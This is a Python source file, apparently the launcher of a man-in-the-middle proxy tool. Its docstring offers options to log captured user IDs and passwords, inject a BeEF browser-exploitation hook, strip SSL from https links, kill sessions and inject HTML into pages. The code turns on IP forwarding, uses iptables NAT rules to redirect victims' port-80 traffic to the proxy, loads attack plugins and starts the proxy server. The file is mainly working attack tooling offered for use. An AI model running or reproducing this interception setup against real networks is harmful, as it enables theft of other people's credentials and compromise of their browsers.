#!/usr/bin/env python

""" starts proxyserver to listen for requests
    and attaches plugins to read and manipulate

    usage: proxy.py [options]

    optional arguments:
      -h, --help         Show this help message and exit
      -l, --loglevel=X   logging level [default: 10]

      -a, --auth         Log userids/passwords
      -b, --beef         Inject beef hook (browser exploitation framework)
      -c, --cats         Replace images with cats
      -f, --favicon      Send lock favicon
      -i, --inject       Inject data/injection.html
      -k, --kill         Kill session on first visit to domain
      -r, --logrequests  Log requests
      -s, --sslstrip     Replace https with http then proxy links via https
      -u, --upsidedown   Show images upsidedown
"""
import os
import sys

import yaml
import logging.config
import logging as log

from docopt import docopt
from mim.proxyserver import ProxyFactory
from twisted.internet import reactor

from mim.tools import su, setTitle, fwreset, LoggerWriter

from mim.version import __version__
from importlib import import_module

PROXYPORT = 10000

def main():
    """ run proxy server and setup callbacks """
    
    # configure logging
    config = yaml.load(open(os.path.join(os.path.dirname( __file__), os.pardir, os.pardir, "logging.yaml")))
    config["formatters"]["long"]["format"] = config["formatters"]["long"]["format"].replace("\\n", "\n")
    logging.config.dictConfig(config)
    sys.stdout = LoggerWriter(log.getLogger("simple"), log.INFO)
    sys.stderr = LoggerWriter(log.getLogger("simple"), log.ERROR)

    # get args
    args = docopt(__doc__, version="version=%s"%__version__)
    log.info(args)
    log.getLogger().setLevel(int(args["--loglevel"]))

    # connect plugins
    pluginfolder = os.path.join(os.path.dirname(__file__), os.pardir, "plugins")
    for module in os.listdir(pluginfolder):
        if module in ('__init__.py') or not module.endswith('.py'):
            continue
        module = module[:-3]
        mod = import_module("mim.plugins.%s"%module)
        mod.init(args)
  
    # create firewall gateway and route port 80 to proxy
    fwreset()
    su("sysctl net.ipv4.ip_forward=1")
    su("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s"%PROXYPORT)
    su("iptables -t nat -A POSTROUTING -j MASQUERADE")
    log.info("iptables redirecting port 80==>%s"%PROXYPORT)

    reactor.listenTCP(PROXYPORT, ProxyFactory())
    log.info("starting proxy server on port %s"%PROXYPORT)
    reactor.run()
    
    fwreset()
if __name__ == '__main__':
    setTitle(__file__)
    main()
